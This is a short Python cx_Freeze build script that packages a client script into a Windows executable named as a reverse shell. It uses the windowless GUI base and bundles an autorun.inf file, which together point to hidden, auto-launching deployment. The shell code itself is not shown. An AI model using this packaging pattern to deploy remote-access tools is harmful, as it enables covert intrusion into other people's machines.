import sys
from cx_Freeze import setup, Executable

files = ['autorun.inf']
base = None

if sys.platform == "win32":
    base = "Win32GUI"

setup(name="SERRYz_Reverse_Shell",
      version="1.0",
      description="This is a Reverse shell used for pen testing purposes only",
      options={'build_exe': {'include_files': files}},
      executables=[Executable("client.py", base=base)])
